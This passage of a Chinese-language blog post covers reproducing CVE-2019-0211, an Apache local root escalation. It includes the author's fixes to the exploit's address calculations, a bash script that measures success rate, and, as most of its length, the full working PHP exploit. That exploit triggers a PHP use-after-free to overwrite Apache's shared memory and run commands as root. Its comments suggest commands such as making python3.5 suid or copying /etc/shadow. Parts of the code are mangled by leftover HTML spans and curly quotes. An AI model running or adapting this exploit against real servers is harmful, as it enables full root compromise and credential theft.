4.  @cfreal的文章中已经说了，我这里在多说句，相关代码可以看看[1](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433)和[2](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L1223)还有`SAFE_ACCPET`的宏定义：

```
<span class="cm">/* On some architectures it's safe to do unserialized accept()s in the single</span>
<span class="cm"> * Listen case.  But it's never safe to do it in the case where there's</span>
<span class="cm"> * multiple Listen statements.  Define SINGLE_LISTEN_UNSERIALIZED_ACCEPT</span>
<span class="cm"> * when it's safe in the single Listen case.</span>
<span class="cm"> */</span>
<span class="cp">#ifdef SINGLE_LISTEN_UNSERIALIZED_ACCEPT</span>
<span class="cp">#define SAFE_ACCEPT(stmt) (ap_listeners-&gt;next ? (stmt) : APR_SUCCESS)</span>
<span class="cp">#else</span>
<span class="cp">#define SAFE_ACCEPT(stmt) (stmt)</span>
<span class="cp">#endif</span> 
```

简单的来说，只有在apache开启多个端口的情况下，才会生成mutex互斥锁，而在github上公布的exp就是通过apache的mutex对象来进行利用的。

### 跑exp中遇到的一些坑

我试过了很多版本，没有一个版本是能直接使用Github上的exp的，在上述表面的版本中，经过调试研究发现了两个问题导致了利用失败：

1.  `$all_buckets = $i - 0x10` 计算出问题
2.  `$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);` 计算出问题

第一个计算`all_buckets`的地址，使用gdb进行调试，你会发现，这个值并没有算错，但是在执行`apache2ctl graceful`命令以后，`all_buckets` 生成了一个新的值，不过只和之前的`all_buckets`地址差`0x38000`，所以这个问题很好解决：

```
<span class="x">$all_buckets = $i - 0x10 + 0x38000;</span> 
```

第二个计算没必要这么复杂，而且在我测试的版本中还是算的错误的地址，直接改成：

```
<span class="x">$bucket_index = $bucket_index_middle;</span> 
```

### ubuntu中的一个坑

我的payload是：`curl "http://www.0-sec.org/cfreal-carpediem.php?cmd=id>/tmp/2323232"`

表面上看是执行成功了，但是却并没有在/tmp目录下发现2323232文件，经过随后的研究发现，systemd重定向了apache的tmp目录，执行下`$find /tmp -name "2323232"`就找到文件了，不过只有root用户能访问。如果不想让systemd重定向tmp目录也简单：

```
$ cat /lib/systemd/system/apache2.service 
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>The Apache HTTP Server
<span class="nv">After</span><span class="o">=</span>network.target remote-fs.target nss-lookup.target

<span class=“o”>[</span>Service<span class=“o”>]</span>

<span class=“nv”>Type</span><span class=“o”>=</span>forking

<span class=“nv”>Environment</span><span class=“o”>=</span><span class=“nv”>APACHE_STARTED_BY_SYSTEMD</span><span class=“o”>=</span><span class=“nb”>true</span>

<span class=“nv”>ExecStart</span><span class=“o”>=</span>/usr/sbin/apachectl start

<span class=“nv”>ExecStop</span><span class=“o”>=</span>/usr/sbin/apachectl stop

<span class=“nv”>ExecReload</span><span class=“o”>=</span>/usr/sbin/apachectl graceful

<span class=“nv”>PrivateTmp</span><span class=“o”>=</span><span class=“nb”>false</span>

<span class=“nv”>Restart</span><span class=“o”>=</span>on-abort `<span class=“o”>[</span>Install<span class=“o”>]</span>

<span class=“nv”>WantedBy</span><span class=“o”>=</span>multi-user.target` 
```

### 关于成功率的说法

在exp的注释中看到了说该利用没法100%成功，有失败的概率，所以我写了个脚本进行测试：

```
<span class="c1">#!/bin/bash</span>

<span class=“nv”>SUCC</span><span class=“o”>=</span><span class=“m”>0</span>

<span class=“nv”>COUNT</span><span class=“o”>=</span><span class=“m”>0</span>

<span class=“k”>for</span> i in <span class=“k”>$(</span>seq <span class=“m”>1</span> <span class=“m”>20</span><span class=“k”>)</span>

<span class=“k”>do</span>

<span class=“nb”>let</span> <span class=“nv”>COUNT</span><span class=“o”>+=</span><span class=“m”>1</span>

/etc/init.d/apache2 stop

sleep <span class=“m”>1</span>

/etc/init.d/apache2 start

<span class=“k”>if</span> <span class=“o”>[</span> -f <span class=“s2”>"/tmp/1982347"</span> <span class=“o”>]</span><span class=“p”>;</span><span class=“k”>then</span>

rm /tmp/1982347

<span class=“k”>fi</span>

curl <span class=“s2”>“[http://localhost/cfreal-carpediem.php?cmd=id&gt;/tmp/1982347](http://localhost/cfreal-carpediem.php?cmd=id&gt;/tmp/1982347)”</span>

apache2ctl graceful

sleep <span class=“m”>1</span>

<span class=“k”>if</span> <span class=“o”>[</span> -f <span class=“s2”>"/tmp/1982347"</span> <span class=“o”>]</span><span class=“p”>;</span><span class=“k”>then</span>

<span class=“nb”>let</span> <span class=“nv”>SUCC</span><span class=“o”>+=</span><span class=“m”>1</span>

<span class=“k”>fi</span>

<span class=“k”>done</span> `<span class=“nb”>echo</span> <span class=“s2”>“COUNT: </span><span class=“nv”>$COUNT</span><span class=“s2”>”</span>

<span class=“nb”>echo</span> <span class=“s2”>“SUCCESS: </span><span class=“nv”>$SUCC</span><span class=“s2”>”</span>` 
```

### 总结

其他版本的还没有进行测试，但是在这里给一些建议。

1.  check all_buckets地址

    这个挺简单的，执行完exp以后，有输出对应的pid和all_buckets地址，可以使用gdb attach上去检查下该地址是否正确：`p all_buckets`

    PS：这里要注意下，需要安装dbg包，才有all_buckets符号 ：`apt install apache2-dbg=2.4.29-1ubuntu4`

    如果有问题，就调试检查exp中搜索all_buckets地址的流程

    如果没问题，就使用gdb attach主进程(root权限的那个进程)，然后断点下在`make_child`，然后执行`apache2ctl graceful`，执行完然后在gdb的流程跳到make_child函数的时候，再输出一次：`p all_buckets`，和exp获取的值对比一下，如果一样就没问题了

2.  check my_bucket地址

    前面的流程和上面一样，重点关注在make_child函数中的my_bucket赋值的代码：[3](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691)

    这里注意下，因为上面有一个fork，所以在gdb里还要加一句：`set follow-fork-mode child`

    `my_bucket`的值是一个指针，指向堆喷的地址，如果`my_bucket`的值没问题，exp基本就没问题了，如果不对，就调整`$bucket_index`

### poc 2

```
<?php
# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation
# Charles Fol
# @cfreal_
# 2019-04-08
#
# INFOS
#
# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html
#
# USAGE
#
# 1\. Upload exploit to Apache HTTP server
# 2\. Send request to page
# 3\. Await 6:25AM for logrotate to restart Apache
# 4\. python3.5 is now suid 0
#
# You can change the command that is ran as root using the cmd HTTP
# parameter (GET/POST).
# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/
#
# SUCCESS RATE
#
# Number of successful and failed exploitations relative to of the number
# of MPM workers (i.e. Apache subprocesses). YMMV.
#
# W  --% S   F
#  5 87% 177 26 (default)
#  8 89%  60  8
# 10 95%  70  4
#
# More workers, higher success rate.
# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.
# Generally, failure is due to all_buckets being relocated too far from its
# original address.
#
# TESTED ON
#
# - Apache/2.4.25
# - PHP 7.2.12
# - Debian GNU/Linux 9.6
#
# TESTING
#
# $ curl http://localhost/cfreal-carpediem.php
# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force
# $ ls -alh /usr/bin/python3.5
# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5
#
# There are no hardcoded addresses.
# - Addresses read through /proc/self/mem
# - Offsets read through ELF parsing
#
# As usual, there are tons of comments.
#

o(‘CARPE (DIEM) ~ CVE-2019-0211’);

o(’’);

error_reporting(E_ALL);

# Starts the exploit by triggering the UAF.

function real()

{

global $y;

$y = [new Z()];

json_encode([0 => &$y]);

}

# In order to read/write what comes after in memory, we need to UAF a string so

# that we can control its size and make in-place edition.

# An easy way to do that is to replace the string by a timelib_rel_time

# structure of which the first bytes can be reached by the (y, m, d, h, i, s)

# properties of the DateInterval object.

# Steps:

# - Create a base object (Z)

# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)

# - Create DateInterval object ($place) meant to be unset and filled by another

# - Trigger the UAF by unsetting $y[0], which is still reachable using $this

# - Unset $place: at this point, if we create a new DateInterval object, it will

# replace $place in memory

# - Create a string ($holder) that fills $place’s timelib_rel_time structure

# - Allocate a new DateInterval object: its timelib_rel_time structure will

# end up in place of abc

# - Now we can control $this->abc’s zend_string structure entirely using

# y, m, d etc.

# - Increase abc’s size so that we can read/write memory that comes after it,

# especially the shared memory block

# - Find out all_buckets’ position by finding a memory region that matches the

# mutex->meth structure

# - Compute the bucket index required to reach the SHM and get an arbitrary

# function call

# - Scan ap_scoreboard_image->parent[] to find workers’ PID and replace the

# bucket

class Z implements JsonSerializable

{

public function jsonSerialize()

{

global $y, $addresses, $workers_pids;

```
 #
	# Setup memory
	#
    o('Triggering UAF');
	o('  Creating room and filling empty spaces');

	# Fill empty blocks to make sure our allocations will be contiguous
	# I: Since a lot of allocations/deallocations happen before the script
	# is ran, two variables instanciated at the same time might not be
	# contiguous: this can be a problem for a lot of reasons.
	# To avoid this, we instanciate several DateInterval objects. These
	# objects will fill a lot of potentially non-contiguous memory blocks,
	# ensuring we get "fresh memory" in upcoming allocations.
	$contiguous = [];
	for($i=0;$i&lt;10;$i++)
		$contiguous[] = new DateInterval('PT1S');

	# Create some space for our UAF blocks not to get overwritten
	# I: A PHP object is a combination of a lot of structures, such as
	# zval, zend_object, zend_object_handlers, zend_string, etc., which are
	# all allocated, and freed when the object is destroyed.
	# After the UAF is triggered on the object, all the structures that are
	# used to represent it will be marked as free.
	# If we create other variables afterwards, those variables might be
	# allocated in the object's previous memory regions, which might pose
	# problems for the rest of the exploitation.
	# To avoid this, we allocate a lot of objects before the UAF, and free
	# them afterwards. Since PHP's heap is LIFO, when we create other vars,
	# they will take the place of those objects instead of the object we
	# are triggering the UAF on. This means our object is "shielded" and
	# we don't have to worry about breaking it.
	$room = [];
	for($i=0;$i&lt;10;$i++)
		$room[] = new Z();

	# Build string meant to fill old DateInterval's timelib_rel_time
	# I: ptr2str's name is unintuitive here: we just want to allocate a
	# zend_string of size 78.
	$_protector = ptr2str(0, 78);

	o('  Allocating $abc and $p');

	# Create ABC
	# I: This is the variable we will use to R/W memory afterwards.
	# After we free the Z object, we'll make sure abc is overwritten by a
	# timelib_rel_time structure under our control. The first 8*8 = 64 bytes
	# of this structure can be modified easily, meaning we can change the
	# size of abc. This will allow us to read/write memory after abc.
	$this-&gt;abc = ptr2str(0, 79);

	# Create $p meant to protect $this's blocks
	# I: Right after we trigger the UAF, we will unset $p.
	# This means that the timelib_rel_time structure (TRT) of this object
	# will be freed. We will then allocate a string ($protector) of the same
	# size as TRT. Since PHP's heap is LIFO, the string will take the place
	# of the now-freed TRT in memory.
	# Then, we create a new DateInterval object ($x). From the same
	# assumption, every structure constituting this new object will take the
	# place of the previous structure. Nevertheless, since TRT's memory
	# block has already been replaced by $protector, the new TRT will be put
	# in the next free blocks of the same size, which happens to be $abc
	# (remember, |abc| == |timelib_rel_time|).
	# We now have the following situation: $x is a DateInterval object whose
	# internal TRT structure has the same address as $abc's zend_string.
	$p = new DateInterval('PT1S');

	#
	# Trigger UAF
	#

	o('  Unsetting both variables and setting $protector');
	# UAF here, $this is usable despite being freed
	unset($y[0]);
	# Protect $this's freed blocks
	unset($p);

	# Protect $p's timelib_rel_time structure
	$protector = ".$_protector";
	# !!! This is only required for apache
	# Got no idea as to why there is an extra deallocation (?)
	if(version_compare(PHP_VERSION, '7.2') &gt;= 0)
        		$room[] = "!$_protector";

	o('  Creating DateInterval object');
	# After this line:
	# &amp;((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str
	# We can control the structure of $this-&gt;abc and therefore read/write
	# anything that comes after it in memory by changing its size and
	# making in-place edits using $this-&gt;abc[$position] = $char
	$x = new DateInterval('PT1S');
	# zend_string.refcount = 0
	# It will get incremented at some point, and if it is &gt; 1,
	# zend_assign_to_string_offset() will try to duplicate it before making
	# the in-place replacement
	$x-&gt;y = 0x00;
	# zend_string.len
	$x-&gt;d = 0x100;
	# zend_string.val[0-4]
	$x-&gt;h = 0x13121110;

	# Verify UAF was successful
	# We modified stuff via $x; they should be visible by $this-&gt;abc, since
	# they are at the same memory location.
	if(!(
		strlen($this-&gt;abc) === $x-&gt;d &amp;&amp;
		$this-&gt;abc[0] == "\x10" &amp;&amp;
		$this-&gt;abc[1] == "\x11" &amp;&amp;
		$this-&gt;abc[2] == "\x12" &amp;&amp;
		$this-&gt;abc[3] == "\x13"
	))
	{
		o('UAF failed, exiting.');
		exit();
	}
	o('UAF successful.');
	o('');

	# Give us some room
	# I: As indicated before, just unset a lot of stuff so that next allocs
	# don't break our fragile UAFd structure.
	unset($room);

	#
	# Setup the R/W primitive
	#

	# We control $abc's internal zend_string structure, therefore we can R/W
	# the shared memory block (SHM), but for that we need to know the
	# position of $abc in memory
	# I: We know the absolute position of the SHM, so we need to need abc's
	# as well, otherwise we cannot compute the offset

	# Assuming the allocation was contiguous, memory looks like this, with
	# 0x70-sized fastbins:
	# 	[zend_string:abc]
	# 	[zend_string:protector]
	# 	[FREE#1]
	# 	[FREE#2]
	# Therefore, the address of the 2nd free block is in the first 8 bytes
	# of the first block: 0x70 * 2 - 24
	$address = str2ptr($this-&gt;abc, 0x70 * 2 - 24);
	# The address we got points to FREE#2, hence we're |block| * 3 higher in
	# memory
	$address = $address - 0x70 * 3;
	# The beginning of the string is 24 bytes after its origin
	$address = $address + 24;
	o('Address of $abc: 0x' . dechex($address));
	o('');

	# Compute the size required for our string to include the whole SHM and
	# apache's memory region
	$distance = 
		max($addresses['apache'][1], $addresses['shm'][1]) -
		$address
	;
	$x-&gt;d = $distance;

	# We can now read/write in the whole SHM and apache's memory region.

	#
	# Find all_buckets in memory
	#

	# We are looking for a structure s.t.
	# |all_buckets, mutex| = 0x10
	# |mutex, meth| = 0x8
	# all_buckets is in apache's memory region
	# mutex is in apache's memory region
	# meth is in libaprR's memory region
	# meth's function pointers are in libaprX's memory region
	o('Looking for all_buckets in memory');
	$all_buckets = 0;

	for(
		$i = $addresses['apache'][0] + 0x10;
		$i &lt; $addresses['apache'][1] - 0x08;
		$i += 8
	)
	{
		# mutex
		$mutex = $pointer = str2ptr($this-&gt;abc, $i - $address);
		if(!in($pointer, $addresses['apache']))
			continue;

		# meth
		$meth = $pointer = str2ptr($this-&gt;abc, $pointer + 0x8 - $address);
		if(!in($pointer, $addresses['libaprR']))
			continue;

		o('  [&amp;mutex]: 0x' . dechex($i));
		o('    [mutex]: 0x' . dechex($mutex));
		o('      [meth]: 0x' . dechex($meth));

		# meth-&gt;*
		# flags
		if(str2ptr($this-&gt;abc, $pointer - $address) != 0)
			continue;
		# methods
		for($j=0;$j&lt;7;$j++)
		{
			$m = str2ptr($this-&gt;abc, $pointer + 0x8 + $j * 8 - $address);
			if(!in($m, $addresses['libaprX']))
				continue 2;
			o('        [*]: 0x' . dechex($m));
		}

		$all_buckets = $i - 0x10;
		o('all_buckets = 0x' . dechex($all_buckets));
		break;
	}

	if(!$all_buckets)
	{
		o('Unable to find all_buckets');
		exit();
	}

	o('');

	# The address of all_buckets will change when apache is gracefully
	# restarted. This is a problem because we need to know all_buckets's
	# address in order to make all_buckets[some_index] point to a memory
	# region we control.

	#
	# Compute potential bucket indexes and their addresses
	#

    o('Computing potential bucket indexes and addresses');

	# Since we have sizeof($workers_pid) MPM workers, we can fill the rest
	# of the ap_score_image-&gt;servers items, so 256 - sizeof($workers_pids),
	# with data we like. We keep the one at the top to store our payload.
	# The rest is sprayed with the address of our payload.

	$size_prefork_child_bucket = 24;
	$size_worker_score = 264;
	# I get strange errors if I use every "free" item, so I leave twice as
	# many items free. I'm guessing upon startup some
	$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
	$spray_max = $addresses['shm'][1];
	$spray_min = $spray_max - $spray_size;

	$spray_middle = (int) (($spray_min + $spray_max) / 2);
	$bucket_index_middle = (int) (
		- ($all_buckets - $spray_middle) /
		$size_prefork_child_bucket
	);

	#
	# Build payload
	#

	# A worker_score structure was kept empty to put our payload in
	$payload_start = $spray_min - $size_worker_score;

	$z = ptr2str(0);

	# Payload maxsize 264 - 112 = 152
	# Offset 8 cannot be 0, but other than this you can type whatever
	# command you want
	$bucket = isset($_REQUEST['cmd']) ?
		$_REQUEST['cmd'] :
		"chmod +s /usr/bin/python3.5";

	if(strlen($bucket) &gt; $size_worker_score - 112)
	{
		o(
			'Payload size is bigger than available space (' .
			($size_worker_score - 112) .
			'), exiting.'
		);
		exit();
	}
	# Align
	$bucket = str_pad($bucket, $size_worker_score - 112, "\x00");

	# apr_proc_mutex_unix_lock_methods_t
	$meth = 
	    $z .
	    $z .
	    $z .
	    $z .
	    $z .
	    $z .
		# child_init
	    ptr2str($addresses['zend_object_std_dtor'])
	;

	# The second pointer points to meth, and is used before reaching the
	# arbitrary function call
	# The third one and the last one are both used by the function call
	# zend_object_std_dtor(object) =&gt; ... =&gt; system(&amp;arData[0]-&gt;val)
	$properties = 
		# refcount
		ptr2str(1) .
		# u-nTableMask meth
		ptr2str($payload_start + strlen($bucket)) .
		# Bucket arData
		ptr2str($payload_start) .
		# uint32_t nNumUsed;
		ptr2str(1, 4) .
	    # uint32_t nNumOfElements;
		ptr2str(0, 4) .
		# uint32_t nTableSize
		ptr2str(0, 4) .
		# uint32_t nInternalPointer
		ptr2str(0, 4) .
		# zend_long nNextFreeElement
		$z .
		# dtor_func_t pDestructor
		ptr2str($addresses['system'])
	;

	$payload =
		$bucket .
		$meth .
		$properties
	;

	# Write the payload

	o('Placing payload at address 0x' . dechex($payload_start));

	$p = $payload_start - $address;
	for(
		$i = 0;
		$i &lt; strlen($payload);
		$i++
	)
	{
		$this-&gt;abc[$p+$i] = $payload[$i];
	}

	# Fill the spray area with a pointer to properties

	$properties_address = $payload_start + strlen($bucket) + strlen($meth);
	o('Spraying pointer');
	o('  Address: 0x' . dechex($properties_address));
	o('  From: 0x' . dechex($spray_min));
	o('  To: 0x' . dechex($spray_max));
	o('  Size: 0x' . dechex($spray_size));
	o('  Covered: 0x' . dechex($spray_size * count($workers_pids)));
	o('  Apache: 0x' . dechex(
		$addresses['apache'][1] -
		$addresses['apache'][0]
	));

	$s_properties_address = ptr2str($properties_address);

	for(
		$i = $spray_min;
		$i &lt; $spray_max;
		$i++
	)
	{
		$this-&gt;abc[$i - $address] = $s_properties_address[$i % 8];
	}
	o('');

	# Find workers PID in the SHM: it indicates the beginning of their
	# process_score structure. We can then change process_score.bucket to
	# the index we computed. When apache reboots, it will use
	# all_buckets[ap_scoreboard_image-&gt;parent[i]-&gt;bucket]-&gt;mutex
	# which means we control the whole apr_proc_mutex_t structure.
	# This structure contains pointers to multiple functions, especially
	# mutex-&gt;meth-&gt;child_init(), which will be called before privileges
	# are dropped.
	# We do this for every worker PID, incrementing the bucket index so that
	# we cover a bigger range.

	o('Iterating in SHM to find PIDs...');

	# Number of bucket indexes covered by our spray
	$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);
	# Number of bucket indexes covered by our spray and the PS structures
	$total_nb_buckets = $spray_nb_buckets * count($workers_pids);
	# First bucket index to handle
	$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);

	# Iterate over every process_score structure until we find every PID or
	# we reach the end of the SHM
	for(
		$p = $addresses['shm'][0] + 0x20;
		$p &lt; $addresses['shm'][1] &amp;&amp; count($workers_pids) &gt; 0;
		$p += 0x24
	)
	{
		$l = $p - $address;
		$current_pid = str2ptr($this-&gt;abc, $l, 4);
		o('Got PID: ' . $current_pid);
		# The PID matches one of the workers
		if(in_array($current_pid, $workers_pids))
		{
			unset($workers_pids[$current_pid]);
			o('  PID matches');
			# Update bucket address
			$s_bucket_index = pack('l', $bucket_index);
			$this-&gt;abc[$l + 0x20] = $s_bucket_index[0];
			$this-&gt;abc[$l + 0x21] = $s_bucket_index[1];
			$this-&gt;abc[$l + 0x22] = $s_bucket_index[2];
			$this-&gt;abc[$l + 0x23] = $s_bucket_index[3];
			o('  Changed bucket value to ' . $bucket_index);
			$min = $spray_min - $size_prefork_child_bucket * $bucket_index;
			$max = $spray_max - $size_prefork_child_bucket * $bucket_index;
			o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));
			# This bucket range is covered, go to the next one
			$bucket_index += $spray_nb_buckets;
		}
	}

	if(count($workers_pids) &gt; 0)
	{
		o(
			'Unable to find PIDs ' .
			implode(', ', $workers_pids) .
			' in SHM, exiting.'
		);
		exit();
	}

	o('');
	o('EXPLOIT SUCCESSFUL.');
	o('Await 6:25AM.');

	return 0;
} 
```

}

function o($msg)

{

# No concatenation -> no string allocation

print($msg);

print("\n");

}

function ptr2str($ptr, $m=8)

{

$out = “”;

for ($i=0; $i<$m; $i++)

{

$out .= chr($ptr & 0xff);

$ptr >>= 8;

}

return $out;

}

function str2ptr(&$str, $p, $s=8)

{

$address = 0;

for($j=$s-1;$j>=0;$j–)

{

$address <<= 8;

$address |= ord($str[$p+$j]);

}

return $address;

}

function in($i, $range)

{

return $i >= $range[0] && $i < $range[1];

}

/**

*   Finds the offset of a symbol in a file.

    */

    function find_symbol($file, $symbol)

    {

    $elf = file_get_contents($file);

    $e_shoff = str2ptr($elf, 0x28);

    $e_shentsize = str2ptr($elf, 0x3a, 2);

    $e_shnum = str2ptr($elf, 0x3c, 2);

    $dynsym_off = 0;

    $dynsym_sz = 0;

    $dynstr_off = 0;

    for($i=0;$i<$e_shnum;$i++)

    {

    $offset = $e_shoff + $i * $e_shentsize;

    $sh_type = str2ptr($elf, $offset + 0x04, 4);

    ```
     $SHT_DYNSYM = 11;
     $SHT_SYMTAB = 2;
     $SHT_STRTAB = 3;

     switch($sh_type)
     {
         case $SHT_DYNSYM:
             $dynsym_off = str2ptr($elf, $offset + 0x18, 8);
             $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);
             break;
         case $SHT_STRTAB:
         case $SHT_SYMTAB:
             if(!$dynstr_off)
                 $dynstr_off = str2ptr($elf, $offset + 0x18, 8);
             break;
     } 
    ```

    }

    if(!($dynsym_off && $dynsym_sz && $dynstr_off))

    exit(’.’);

    $sizeof_Elf64_Sym = 0x18;

    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)

    {

    $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;

    $st_name = str2ptr($elf, $offset, 4);

    ```
     if(!$st_name)
         continue;

     $offset_string = $dynstr_off + $st_name;
     $end = strpos($elf, "\x00", $offset_string) - $offset_string;
     $string = substr($elf, $offset_string, $end);

     if($string == $symbol)
     {
         $st_value = str2ptr($elf, $offset + 0x8, 8);
         return $st_value;
     } 
    ```

    }

    die('Unable to find symbol ’ . $symbol);

    }

# Obtains the addresses of the shared memory block and some functions through

# /proc/self/maps

# This is hacky as hell.

function get_all_addresses()

{

$addresses = [];

$data = file_get_contents(’/proc/self/maps’);

$follows_shm = false;

```
foreach(explode("\n", $data) as $line)
{
	if(!isset($addresses['shm']) &amp;&amp; strpos($line, '/dev/zero'))
	{
        $line = explode(' ', $line)[0];
        $bounds = array_map('hexdec', explode('-', $line));
    $msize = $bounds[1] - $bounds[0];
        if ($msize &gt;= 0x10000 &amp;&amp; $msize &lt;= 0x16000)
        {
            $addresses['shm'] = $bounds;
            $follows_shm = true;
        }
    }
	if(
		preg_match('#(/[^\s]+libc-[0-9.]+.so[^\s]*)#', $line, $matches) &amp;&amp;
		strpos($line, 'r-xp')
	)
	{
		$offset = find_symbol($matches[1], 'system');
		$line = explode(' ', $line)[0];
		$line = hexdec(explode('-', $line)[0]);
		$addresses['system'] = $line + $offset;
	}
	if(
		strpos($line, 'libapr-1.so') &amp;&amp;
		strpos($line, 'r-xp')
	)
	{
		$line = explode(' ', $line)[0];
		$bounds = array_map('hexdec', explode('-', $line));
		$addresses['libaprX'] = $bounds;
	}
	if(
		strpos($line, 'libapr-1.so') &amp;&amp;
		strpos($line, 'r--p')
	)
	{
		$line = explode(' ', $line)[0];
		$bounds = array_map('hexdec', explode('-', $line));
		$addresses['libaprR'] = $bounds;
	}
	# Apache's memory block is between the SHM and ld.so
	# Sometimes some rwx region gets mapped; all_buckets cannot be in there
	# but we include it anyways for the sake of simplicity
	if(
		(
			strpos($line, 'rw-p') ||
			strpos($line, 'rwxp')
		) &amp;&amp;
        $follows_shm
	)
	{
        if(strpos($line, '/lib'))
        {
            $follows_shm = false;
            continue;
        }
		$line = explode(' ', $line)[0];
		$bounds = array_map('hexdec', explode('-', $line));
		if(!array_key_exists('apache', $addresses))
		    $addresses['apache'] = $bounds;
		else if($addresses['apache'][1] == $bounds[0])
            $addresses['apache'][1] = $bounds[1];
		else
            $follows_shm = false;
	}
	if(
		preg_match('#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#', $line, $matches) &amp;&amp;
		strpos($line, 'r-xp')
	)
	{
		$offset = find_symbol($matches[1], 'zend_object_std_dtor');
		$line = explode(' ', $line)[0];
		$line = hexdec(explode('-', $line)[0]);
		$addresses['zend_object_std_dtor'] = $line + $offset;
	}
}

$expected = [
	'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'
];
$missing = array_diff($expected, array_keys($addresses));

if($missing)
{
	o(
		'The following addresses were not determined by parsing ' .
		'/proc/self/maps: ' . implode(', ', $missing)
	);
	exit(0);
}

o('PID: ' . getmypid());
o('Fetching addresses');

foreach($addresses as $k =&gt; $a)
{
	if(!is_array($a))
		$a = [$a];
	o('  ' . $k . ': ' . implode('-0x', array_map(function($z) {
			return '0x' . dechex($z);
	}, $a)));
}
o('');

return $addresses; 
```

}

# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,

# matching the cmdline and the UID

function get_workers_pids()

{

o(‘Obtaining apache workers PIDs’);

$pids = [];

$cmd = file_get_contents(’/proc/self/cmdline’);

$processes = glob(’/proc/*’);

foreach($processes as $process)

{

if(!preg_match(’#^/proc/([0-9]+)$#’, $process, $match))

continue;

$pid = (int) $match[1];

if(

!is_readable($process . ‘/cmdline’) ||

!is_readable($process . ‘/status’)

)

continue;

if($cmd !== file_get_contents($process . ‘/cmdline’))

continue;

```
 $status = file_get_contents($process . '/status');
	foreach(explode("\n", $status) as $line)
	{
		if(
			strpos($line, 'Uid:') === 0 &amp;&amp;
			preg_match('#\b' . posix_getuid() . '\b#', $line)
		)
		{
			o('  Found apache worker: ' . $pid);
			$pids[$pid] = $pid;
			break;
		}

	}
}

o('Got ' . sizeof($pids) . ' PIDs.');
o('');

return $pids; 
```

} `$addresses = get_all_addresses();

$workers_pids = get_workers_pids();

real();` 
```